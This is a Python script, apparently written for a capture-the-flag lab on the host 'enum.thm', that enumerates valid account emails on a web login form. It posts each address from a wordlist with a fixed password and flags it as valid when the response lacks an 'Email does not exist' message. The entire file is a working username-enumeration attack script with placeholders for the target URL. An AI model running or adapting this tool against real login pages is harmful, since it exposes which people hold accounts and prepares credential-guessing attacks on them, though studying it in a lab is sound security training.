import sys
import requests

def check_email(email):
    url = 'Enter Target URL Here'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Referer': 'CHANGE THIS',
    }
    data = {
        'username': email,
        'password': 'password123',
        'function': 'login'
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=5)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Could not connect to {url}: {e}")
        return None
    except requests.exceptions.JSONDecodeError:
        print(f"[ERROR] Response was not JSON for email '{email}'. Raw response: {response.text}")
        return None

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Double-check exact wording from response

    try:
        with open(email_file, 'r', encoding='utf-8', errors='ignore') as file:
            emails = file.readlines()
    except FileNotFoundError:
        print(f"[ERROR] Could not find wordlist file: {email_file}")
        sys.exit(1)

    for email in emails:
        email = email.strip()
        if not email:
            continue

        res = check_email(email)
        if res is None:
            continue

       
        message = str(res.get('message', res.get('msg', '')))
        
        if invalid_error.lower() in message.lower():
            print(f"[-] INVALID: {email}")
        else:
            print(f"[+] VALID:   {email}")
            valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]
    valid_emails = enumerate_emails(email_file)

    print("\n--- Valid Emails Found ---")
    for valid_email in valid_emails:
        print(valid_email)
